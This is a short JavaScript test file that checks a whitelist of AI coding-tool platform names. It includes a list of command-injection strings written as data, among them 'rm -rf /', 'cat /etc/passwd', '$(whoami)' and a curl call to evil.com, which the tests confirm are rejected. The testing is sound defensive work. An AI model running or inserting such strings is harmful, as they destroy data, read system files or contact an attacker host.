const VALID_PLATFORMS = ['opencode', 'claude-code', 'cursor', 'copilot', 'aider', 'gemini-cli'];
const INJECTION_ATTEMPTS = [
  'opencode; rm -rf /',
  'cursor && echo hacked',
  'aider | cat /etc/passwd',
  "copilot' --help",
  '$(whoami)',
  '`id`',
  'opencode & curl evil.com',
  '|| exit 1',
  '; echo pwned;',
  '| ls',
];

let passed = 0;
let failed = 0;

function assert(condition, name) {
  if (condition) { passed++; }
  else { console.error(`FAIL  ${name}`); failed++; }
}

// Test 1: All valid platforms pass whitelist
for (const p of VALID_PLATFORMS) {
  assert(VALID_PLATFORMS.includes(p), `valid platform: ${p}`);
}

// Test 2: All injection attempts fail whitelist
for (const p of INJECTION_ATTEMPTS) {
  assert(!VALID_PLATFORMS.includes(p), `reject injection: ${p}`);
}

// Test 3: Default platform is opencode
assert(VALID_PLATFORMS[0] === 'opencode', 'default platform is opencode');

// Test 4: All 6 expected platforms are present
assert(VALID_PLATFORMS.length === 6, 'exactly 6 valid platforms');

// Test 5: Empty string is rejected
assert(!VALID_PLATFORMS.includes(''), 'reject empty platform');

// Test 6: null/undefined is rejected
assert(!VALID_PLATFORMS.includes(null), 'reject null');
assert(!VALID_PLATFORMS.includes(undefined), 'reject undefined');

// Test 7: Case sensitivity
assert(!VALID_PLATFORMS.includes('OPENCODE'), 'reject uppercase');
assert(!VALID_PLATFORMS.includes('OpenCode'), 'reject mixed case');

// Test 8: Newlines and special chars rejected
assert(!VALID_PLATFORMS.includes('opencode\n'), 'reject trailing newline');
assert(!VALID_PLATFORMS.includes('cursor\r'), 'reject trailing CR');
assert(!VALID_PLATFORMS.includes('copilot\t'), 'reject trailing tab');

console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
